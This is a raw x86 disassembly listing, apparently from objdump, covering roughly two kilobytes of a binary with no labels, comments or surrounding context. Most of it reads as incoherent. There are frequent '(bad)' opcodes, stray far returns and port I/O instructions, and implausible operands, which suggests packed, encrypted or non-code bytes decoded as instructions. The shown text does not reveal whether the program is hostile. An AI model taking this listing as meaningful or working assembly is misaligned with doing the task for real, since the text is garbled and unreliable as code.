  4177e4:	and    al,BYTE PTR [ebp+eiz*2+0x75a5b4e9]
  4177eb:	dec    edx
  4177ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ed:	push   edi
  4177ee:	dec    edi
  4177ef:	nop
  4177f0:	je     0x4177f7
  4177f2:	mov    bl,0x7d
  4177f4:	mov    ah,0xa9
  4177f6:	xchg   esp,eax
  4177f7:	aaa    
  4177f8:	sub    al,ch
  4177fa:	retf   
  4177fb:	xlat   BYTE PTR ds:[ebx]
  4177fc:	mov    cl,BYTE PTR [edi+eax*1+0x5adbfe8f]
  417803:	retf   0xdaf1
  417806:	fmul   DWORD PTR [esi+0x38]
  417809:	xor    al,BYTE PTR [ebx+eax*8-0x3dff527a]
  417810:	mov    ebp,0x7efd3f92
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
